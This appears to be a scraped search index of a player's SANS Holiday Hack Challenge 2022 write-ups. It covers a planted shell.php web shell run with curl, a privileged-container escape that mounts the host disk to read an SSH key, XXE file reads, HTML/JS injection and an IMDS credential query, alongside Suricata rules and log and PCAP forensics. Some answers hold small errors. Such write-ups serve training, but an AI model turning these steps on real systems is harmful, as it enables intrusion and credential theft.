<p>Clone the git repo again with SSH using the private key   of the user sporx@kringlecon.com to a directory named   \"wordpress.flag.net.internal2\"</p>     <pre><code>git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git\nwordpress.flag.net.internal2\n</code></pre>          <p>The repo is now cloned to the \"wordpress.flag.net.internal2\"   directory</p>     <pre><code>ls wordpress.flag.net.internal2\n</code></pre>          <p>Create a new backdoor to execute commands on the remote   host (wordpress web server, wordpress.flag.net.internal). This will take a   querystring cat=&lt;URL encoded command&gt;</p>     <pre><code>nano shell.php\n</code></pre>          <p>Add the newly saved shell.php and commit to the repo</p>     <pre><code>git add .\ngit commit\n</code></pre>          <p>Push the changes to the remote repository</p>     <pre><code>git push\n</code></pre>          <p>Now we can execute arbitrary commands using shell.php.   Below showing using ls command which also lists newly uploaded shell.php</p>     <pre><code>curl http://wordpress.flag.net.internal/shell.php?cmd=ls\n</code></pre>          <p>Getting contents of root (/) showing flag.txt</p>     <pre><code>curl http://wordpress.flag.net.internal/shell.php?cmd=ls%20%2F%2F\n</code></pre>          <p>Getting the contents of that /flag.txt</p>     <pre><code>curl http://wordpress.flag.net.internal/shell.php?cmd=cat%20%2Fflag.txt\n</code></pre>          <p>Answer : oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT</p>     <p>The objective is now completed and we get 100 coins as   well</p>      <p>At this point we have recovered the Elfen ring</p>"},{"location":"ElfenRing/PrisonEscape/","title":"Prison Escape","text":"<p>Prison   Escape    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Elfen   Ring    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Tinsel   Upatree</p>             <p>Hint from Bow Ninecandle 1) Were you able to mount up? If so, users' home/ directories can be a great   place to look for secrets...   2) When users are over-privileged, they can often act as root. When   containers have too many permissions, they can affect the host!</p>       <p>We can escalate to root using sudo</p>     <pre><code>sudo -l\nsudo -i \nwhoami\n</code></pre>          <p>The container is running in privileged mode. So we can run   the below to list disk partitions on the host.</p>     <pre><code>fdisk -l\n</code></pre>               <p>Make a folder under /mnt and mount   /dev/vda to it</p>     <pre><code>mkdir /mnt/host_drive\nmount /dev/vda /mnt/host_drive\n</code></pre>            <p>The   host partition is mounted successfully, and we can see the file jail.key.priv   in the /home/jailer/.ssh directory </p>     <pre><code>ls /mnt/host_drive/home -lR -lah\n</code></pre>            <p>Read the contents of the file jail.key.priv.</p>     <p>cat /mnt/host_drive/home/jailer/ssh/jail.key.priv</p>          <p>Answer : 082bb339ec19de4935867</p>     <p>The objective is now completed    and we get 25 coins as well </p>"},{"location":"TolkienRing/SuricataRegatta/","title":"Suricata Regatta","text":"<p>Suricata   Regatta    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Tolkien   Ring    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Fitzy   Shortstack</p>     <p>Help detect this kind of malicious activity in the   future by writing some Suricata rules. Work with Dusty Giftwrap in the   Tolkien Ring to get some hints.</p>             <p>Hint from Dusty Giftwrap https://suricata.readthedocs.io/en/suricata-6.0.0/rules/intro.html</p>       <p>Q1. First,   please create a Suricata rule to catch DNS lookups for adv.epostoday.uk.</p> <p>Whenever   there's a match, the alert message (msg) should read Known bad DNS lookup,   possible Dridex infection</p>     <p>Answer</p> <pre><code>  alert dns any any -&gt; any any (msg:\"Known bad DNS lookup, possible Dridex infection\";\\\n  dns_query; content:\"adv.epostoday.uk\"; depth:20; fast_pattern; endswith; nocase; classtype:pup-activity; sid:200; rev:2;)\n</code></pre>          <p>Q2. Develop   a Suricata rule that alerts whenever the infected IP address 192.185.57.242   communicates with internal systems over HTTP. When there's a match, the   message (msg) should read Investigate suspicious connections, possible Dridex   infection</p>     <p>Answer</p> <pre><code>alert tls any any -&gt; any any (msg:\"Investigate bad certificates, possible Dridex infection\";\\\ntls.subject:\"CN=heardbellith.Icanwepeh.nagoya\"; sid:400; rev:2;\n</code></pre>          <p>Q3. We   heard that some naughty actors are using TLS certificates with a specific CN.</p> <p>Develop a   Suricata rule to match and alert on an SSL certificate for heardbellith.Icanwepeh.nagoya.</p> <p>When your   rule matches, the message (msg) should read Investigate bad certificates,   possible Dridex infection</p>     <p>Answer:</p> <pre><code>  alert tls any any -&gt; any any (msg:\"Investigate bad certificates, possible Dridex infection\";\\ \n  tls.subject:\"CN=heardbellith.Icanwepeh.nagoya\"; sid:400; rev:2;)\n</code></pre>          <p>Q4. Let's   watch for one line from the JavaScript: let byteCharacters = atob</p> <p>Oh, and   that string might be GZip compressed - I hope that's OK!</p> <p>Just in   case they try this again, please alert on that HTTP data with message   Suspicious JavaScript function, possible Dridex infection</p>     <p>Answer:    <pre><code>  alert http any any -&gt; any any (msg:\"Suspicious JavaScript function, possible Dridex infection\";\\ \n  file_data; content:\"let byteCharacters = atob\"; sid:500; rev:2;)\n</code></pre>     <p>The objective   is now completed, and we get 25 coins as well </p>     <p>At this point we have recovered the Tolkien ring.</p>"},{"location":"TolkienRing/WindowsEventLogs/","title":"Windows Event Logs","text":"<p>   Windows Event Logs    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Tolkien   Ring   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Dusty   Giftwrap</p>             <p>Windows Event log file (.EVTX) https://storage.googleapis.com/hhc22_player_assets/powershell.evtx </p>        <p>In the terminal, we are asked a series of questions from the .EVTX file.</p>            <p>As the 1st step, we convert the   powershell.evtx to CSV</p> <p> <pre><code>Get-WinEvent -Path powershell.evtx `\n| Export-Csv powershell_logs.csv -NoTypeInformation&lt;/p&gt;\n</code></pre>        <p>Q1. What month/day/year did the attack take place?</p>     <p>Answer : 12/24/2022</p>     <p>#   check for all dates for the events which mentioned the word 'recipe'</p> <p> <pre><code>Import-Csv powershell_logs.csv | Where-Object\n{$_.'message' -like '*recipe*'} | select TimeCreated\n</code></pre> </p> <p># There  were 56 events where \"recipe\" was mentioned</p> <p> <pre><code>(Import-Csv powershell_logs.csv | Where-Object {$_.'message'\n-like '*recipe*'} | select TimeCreated).count\n</code></pre> </p> <p>   Out of 56, there were only 3 events on 12/18/2022 which mentioned recipe and   they look innocuous. So the attack took place on 12/24/2024.</p>       <p>Q2. An attacker got a secret from a file. What was   the original file's name?</p>     <p>Answer: Recipe</p>     <p>The attacker got a secret from a file which means they may have used Get-Content.</p> <p>So,   we look for that in the events on 12/24/2022 <pre><code>Import-Csv powershell_logs.csv | Where-Object {$_.'message' -like '*$foo*'\n-and $_.'message' -like '*Get-Content*' -and $_.TimeCreated -like\n'*12/24/2022*'} | select message | Format-Table -Wrap -Autosize\n</code></pre> </p>   <p>And here it is. They are trying to get the content from a file named Recipe,   replacing 'honey' with 'fish oil' and putting the changed content in the   variable named $foo</p>         <p>Q3. The contents of the previous file   were retrieved, changed, and stored to a variable by the attacker. This was   done multiple times. Submit the last full PowerShell line that performed only   these actions.</p>     <p>Answer :</p> <p>$foo =   Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'}</p>     <p>The attacker   retrieved contents of the file, changed, and stored to a variable. So, they   may have used \"Get-Content\" </p> <pre><code>Import-Csv powershell_logs.csv | Where-Object\n{$_.'message' -like '*$foo*' -and $_.'message' -like '*Get-Content*' -and\n$_.TimeCreated -like '*12/24/2022*'} | select message | Format-Table -Wrap\n-Autosize\n</code></pre>         <p>Q4. After   storing the altered file contents into the variable, the attacker used the   variable to run a separate command that wrote the modified data to a file.   This was done multiple times. Submit the last full PowerShell line that   performed only this action.</p>     <p>Answer :$foo   | Add-Content -Path 'Recipe'</p>     <p>To write   altered file contents from a variable to a file, attacker may have used   Add-Content.</p> <p> <pre><code>Import-Csv powershell_logs.csv | Where-Object\n{$_.'message' -like '*$foo*' -and $_.'message' -like '*Add-Content*' -and\n$_.TimeCreated -like '*12/24/2022*'} | select message | Format-Table -Wrap\n-Autosize\n</code></pre> </p>         <p>Q5.   The attacker ran the previous command against one file multiple times. What   is the name of this file?</p>     <p>Answer : Recipe.txt</p>     <p> <pre><code>Import-Csv powershell_logs.csv | Where-Object\n{$_.'message' -like '*$foo*' -and $_.'message' -like '*Add-Content*' -and\n$_.TimeCreated -like '*12/24/2022*'} | select message | Format-Table -Wrap\n-Autosize\n</code></pre> </p>              <p>Q7. Was   the original file (from question 2) deleted? (Yes/No)</p>     <p>Answer: No</p>     <p>From question   2, the original file name was \"recipe\".</p> <p>The files   deleted were recipe.txt and recipe_updated.txt.</p> <p> <pre><code>Import-Csv powershell_logs.csv | Where-Object {$_.'message'\n-like '*del*' -and $_.TimeCreated -like '*12/24/2022*'} | select message |\nFormat-Table -Wrap -Autosize\n</code></pre> </p>         <p>Q6. Were   any files deleted?</p>     <p>Answer : Yes</p>     <p>Looking for   usage of 'del' command in PowerShell events. Looks like 2 files were deleted.</p> <p> <pre><code>Import-Csv powershell_logs.csv | Where-Object\n{$_.'message' -like '*del*' -and $_.TimeCreated -like '*12/24/2022*'} |\nselect message | Format-Table -Wrap -Autosize\n</code></pre> </p>          <p>Q8. What   is the Event ID of the logs that show the actual command lines the attacker   typed and ran?</p>     <p>Answer : 4104</p>     <p>Looking for   the event id of the event showing file deletion and It looks like 4104</p> <p> <pre><code>Import-Csv powershell_logs.csv | Where-Object\n{$_.'message' -like '*del*' -and $_.TimeCreated -like '*12/24/2022*'} |\nselect Id,Message | Format-Table -Wrap -Autosize\n</code></pre> </p>        <p>Q9. Is the   secret ingredient compromised (Yes/No)?</p>     <p>Answer: Yes</p>     <p>This is   because :</p> <p># The   attacker got the content from original recipe file and replaced the honey   with fish oil and put that updated value in the variable $foo</p> <p> <pre><code>$foo = Get-Content .\\Recipe| % {$_ -replace 'honey',\n'fish oil'}\n</code></pre> </p> <p>And then   wrote the changed variable back to the original file named Recipe</p> <p> <pre><code>$foo | Add-Content -Path 'Recipe'\n</code></pre> </p>       <p>Q10. What   is the secret ingredient?</p>     <p>Answer: Honey</p>     <p>From   the answer to the question 9) the ingredient which got replaced in the   original recipe file was honey.</p> <p>Therefore, the secret ingredient is honey</p>      <p>The objective is now completed and we get   10 coins as well </p>"},{"location":"TolkienRing/WiresharkPhishing/","title":"Wireshark Phishing","text":"<p> Wireshark Phishing                 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0                 Tolkien Ring                 \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0                 Sparkle Redberry                 </p>     <p>Objective : Use the Wireshark Phishing terminal in the   Tolkien Ring to solve the mysteries around the suspicious PCAP. Get hints for   this challenge by typing hint in the upper panel of the terminal.</p>             <p>PCAP file :  https://storage.googleapis.com/hhc22_player_assets/suspicious.pcap</p>    <p>We type \"yes\" on the terminal and that prompts a series of questions.</p>               <p>Question 1 : There are objects in the PCAP file   that can be exported by Wireshark and/or tshark. What kind of objects can be   exported from this PCAP</p>      <p>Answer : http</p>     <p>Open the suspicious.pcap in Wireshark and go to   File &gt; Export Object. We choose every option there and see exportable   items in the list only when we select HTTP</p>                <p>Question 2 : What is the file name of the   largest file we can export?</p>     <p>Answer : app.php</p>     <p>Open the exportable objects by clicking on File &gt;   Export Objects &gt; HTTP.</p> <p>Sort the objects by clicking the Size column in   descending order. app.php is of largest file (808 KB)</p>             <p>Question 3: What packet number starts that app.php   file?</p>     <p>Answer: 687</p>     <p>In the Wireshark exportable objects under HTTP,   app.php shows to start from packet number 687 </p>            <p>Question 4: What is the IP address of the   Apache server?</p>     <p>Answer: 192.185.57.242</p>     <p>Added a   new column named with \"http.server\" to show the server name and put   the below filter http &amp;&amp;   http.server==\"Apache\"</p>                   <p>Question 5: What file is saved to the infected   host?</p>     <p>Answer : Ref_Sept24-2020.zip</p>     <p>Save the app.php from the exportable HTTP objects.    Examine the file in a text editor and around line number 68, Ref_Sept24-2020.zip   is being saved to local host.</p>                     <p>Question 6: Attackers used bad TLS certificates   in this traffic. Which countries were they registered to? Submit the names of   the countries in alphabetical order separated by a comma (Ex: Norway, South   Korea).</p>     <p>Answer : Ireland, Israel, South Sudan, United   States</p>     <p>The challenge provides a URL   as a hint. This has the filters for TLS traffic in the Wireshark pcap file.</p> <p>Filtering with ssl.handshake.type == 11, below would   get us the certificates sent.</p> <p>For the selected packet we can look the certificate   section and get the country code of the issuer.</p> <p>Looking at all the available packets, we get the   following country codes : IE, IL, US , SS   Get the names for the code and arranging them alphabetically: Ireland,   Israel, South Sudan, United States</p>                       <p>Question 7 : is the host infected (Yes/No)?</p>     <p>Answer : Yes</p>     <p>The app.php access was successful (200 OK) and that   file downloads the Ref_Sept24-2020.zip. So, yes, the host is infected.</p>        <p>The objective is now completed, and we   get 5 coins as well. </p>"},{"location":"WebRing/404FTW/","title":"404 FTW","text":"<p>404 FTW     \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Web Ring     \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Alabaster   Snowball</p>                  <p>Open victim.pcap in Wireshark   and filter with traffic coming from 18.222.86.32 with HTTP status 200 and 404</p>     Filter   :    <pre><code>http &amp;&amp; ip.dst==18.222.86.32\n</code></pre> Display filter :    <pre><code>http.response.code==200 or http.response.code==404\n</code></pre>          <p>Note the first successful attack with HTTP 200 OK</p>          <p>Examining the HTTP content of the selected traffic we   see the request was successful for /proc</p>          <p>Answer : /proc</p>     <p>Upon submitting the answer, objective is now completed,   and we get 5 coins.</p>"},{"location":"WebRing/CredentialMining/","title":"Credential Mining","text":"<p>Credential   Mining     \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Web Ring     \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Alabaster   Snowball</p>             <p>Hint    https://owasp.org/www-community/attacks/Brute_force_attack</p>       <p>Open victim.pcap and then look at the first instance of   POST /login.html because thats when the 1st POST was done on login.html to   send the user name and password.</p>     <pre><code>http &amp;&amp; http.request.method==\"POST\" &amp;&amp; http.request.uri==\"/login.html\"\n</code></pre>          <p>Answer: alice</p>     <p>Upon   submitting the answer, the objective is now completed, and we get 5 coins as   well</p>"},{"location":"WebRing/GlamtarielsFountain/","title":"Glamtariels Fountain","text":"<p>Glamtariels Fountain  Web   Ring    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Akbowl</p>             <p>Hint :    Early parts of this challenge can be solved by focusing on Glamtariel's WORDS.         <p>This challenge is hosted on https://glamtarielsfountain.com/   . There is Princess Glamtrariel and a fountain and on the right side 4 items.   It looks like when we drop them one by one on both Glamtariel and the   mountain, they share something with us. Per the hint, we focus on the UPPERCASE   words in their dialogues.</p>     <p>Items</p>   <p>UPPERCASE   Words in the dialogues</p>     <p>1st   set</p>    <p>2nd   Set</p>    <p>3rd   Set</p>    <p> Simple Format</p> <p> Type</p> <p> Tamper</p> <p> Traffic Flies</p> <p> Path</p>   <p> App</p> <p> Ringlist</p>      <p>As the dialogues mention we need to look at how the   TRAFFIC FLIES, we intercept the traffic each time an item is dropped on the   princess or the fountain. Turns out JSON is being sent and dialogs separated   by ^ are sent as response.</p>                   <p>XML is   another format in which you can TAMPER the request. Especially, if the   application is vulnerable to XXE (XML External Entity) attack. So converted   the JSON request payload to XML using the Burp Suite extension named Content   Type Converter.</p>            <p>Since the   hint mentioned TAMPER, tried tampering with requests using Burp Suite. But   nothing useful would come up</p>     <p>Request   JSON</p>   <p>Response   JSON</p>             <p>After   changing to XML content type and also changing the reqType to xml in the   payload, we get : \"Zoom, Zoom, very hasty, can't do that yet!^Zoom,   Zoom, very hasty, can't do that yet!\"</p>     <p>Request</p>   <p>Response</p>             <p>Above meant   the input XML request is correct, but we need to continue dropping items   which we continue to do.    At last, dropping the 1st item of the 3rd set of items,   we get a different message in the response.</p>     <p>Request</p>   <p>Response</p>             <p>Now we build   our XXE payload looking for a local file file:///app/static/images/ringlist.txt   - The path is /app/static/images because thats where all the images are.   - The file name is ringlist.txt because princess notes previously I keep a   list of all my rings in my RINGLIST file.   - The file extension is .txt because princess notes previously I like to   keep track of my rings using a SIMPLE FORMAT. </p>     <p>Request </p>   <p>Response</p>                              <p>In the   response above, there is a path to a file static/images/pholder-morethantopsupersecret63842.png.   So when we visit that file using the full URL, It shows picture of a folder   named x_phial_pholder_2022 with two files named bluering.txt and redring.txt</p>  <p>Injecting   with bluering.txt and redring.txt does not show anything interesting. file:///app/static/images/x_phial_pholder_2022/redring.txt</p> <p>file:///app/static/images/x_phial_pholder_2022/bluering.txt</p>          <p>We note   princess said at one point of time she didnt have a silver ring. So next we   would inject with silvering.txt and that brings static/images/x_phial_pholder_2022/redring-supersupersecret928164.png   in the response.</p>     <p>Request</p>   <p>Response</p>                <p>Visiting redring-supersupersecret928164.png   from the below URL shows this image:   https://glamtarielsfountain.com/static/images</p> <p>/x_phial_pholder_2022/redring-supersupersecret928164.png</p> <p>There is text   named which appears to name another text file goldring_to_be_deleted.txt  </p>      <p>So, next we   feed goldring_to_be_deleted.txt to the XXE  file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt</p>     <p>Request</p>   <p>Response </p>                       <p>The bold REQest   and secret TYPE potentially suggests that we should pass &amp;xxe   in the requestType and static image in the imgDrop and It shows another file   path in the response :   static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,</p>     <p>Request</p>   <p>Response</p>             <p>We see the   golden ring when wivit the full URL https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png</p>          <p>Answer :   goldring-morethansupertopsecret76394734.png</p>        <p>We enter goldring-morethansupertopsecret76394734.png   as the answer and that is accepted, and we get 100 coins as well.</p>          <p>As this   point we have recovered the web ring</p>"},{"location":"WebRing/IMDSandXXE/","title":"IMDS, XXE and other abbreviations","text":"<p>IMDS, XXE and other   abbreviations  Web   Ring    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Alabaster   Snowball</p>             <p>Hint :  AWS uses a specific IP address to access\u00a0IMDS,   and that IP only appears twice in this PCAP.</p>        <p>Open victim.pcap in Wireshark and put a filter to get   only HTTP requests and dest ip as AWS EC2 Metadata service IP 169.254.169.254</p>     <pre><code>http &amp;&amp; ip.dst==169.254.169.254\n</code></pre>          <p>Right click on the last instance and select Follow &gt;   HTTP Stream for the below URL   /latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance   HTTP/1.0</p>          <p>Answer : http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance</p>     <p>Upon submitting the answer the objective is now   completed and we get 10 coins as well  </p>"},{"location":"WebRing/NaughtyIP/","title":"Naughty IP","text":"<p>Naughty   IP     \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Web   Ring     \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Alabaster   Snowball</p>             <p>Hint from Alabaster Snowball The victim web server is 10.12.42.16. Which host is the next\u00a0top   talker?</p> <p>https://storage.googleapis.com/hhc22_player_assets/boriaArtifacts.zip</p>       <p>The briaArtifacts.zip has two files : victim.pcap and   weberror.txt</p>          <p>In the zip file, open victim.pcap in Wireshark</p> <p>Got to Statistics &gt; Conversations </p> <p>Sort the \"bytes\" column in descending order</p>          <p>Answer :   18.222.86.32</p>     <p>Upon   submitting the answer, the objective is now completed, and we get 5 coins </p>"},{"location":"WebRing/OpenBoriaMineDoor/","title":"Open Boria Mine Door","text":"<p>Open Boria Mine Door  Web   Ring    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0   Hal Tandybuck</p>               <p>Pin 1</p>     <p>Initial   State</p>   <p>HTML   Source</p>   <p>Input</p>   <p>Result</p>           <p>The HTML   Source has the answer:    @&amp;@&amp;&amp;W&amp;&amp;W&amp;&amp;&amp;&amp;  </p>        <p>Pin 2</p>     <p>The comment in the   HTML source indicates the developer is yet to filter out HTML code. So, we   can send any HTML to draw SVG to connect the pipes. </p>           <p>&lt;html&gt;</p> <p>&lt;body&gt;</p> <p>&lt;svg   height=\"210\"</p> <p>width=\"500\"&gt;</p> <p>&lt;line   x1=\"0\" y1=\"70\" x2=\"200\" y2=\"155\"   style=\"stroke:rgb(255,255,255);stroke-width:20\" /&gt;</p> <p>&lt;/svg&gt;</p> <p>\u00a0&lt;/body&gt;</p> <p>&lt;/html&gt;</p>         <p>Pin 3</p>     <p>The comment in HTML source indicates the developer is   yet to filter out Javascript code. So, we can send any script to draw the SVG   to connect the pipes. It has 'unsafe-inline' Content Security Policy as well   which allows execution of inline scripts.</p>           <p>&lt;html&gt;&lt;body&gt;&lt;canvas   id=\"myCanvas\" width=\"200\" height=\"100\"   style=\"border:1px solid #c3c3c3;\"&gt;</p> <p>&lt;/canvas&gt;&lt;script&gt;var   canvas = document.getElementById(\"myCanvas\");</p> <p>var   ctx = canvas.getContext(\"2d\");</p> <p>ctx.beginPath();</p> <p>ctx.moveTo(0,   90);</p> <p>ctx.lineTo(250,   10);</p> <p>ctx.strokeStyle   = 'blue';</p> <p>ctx.lineWidth   = 20;</p> <p>ctx.stroke();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</p>            <p>Upon   completing the Pin 3, the boria mine door is opened, and we get 25 coins as   well.</p>"}]}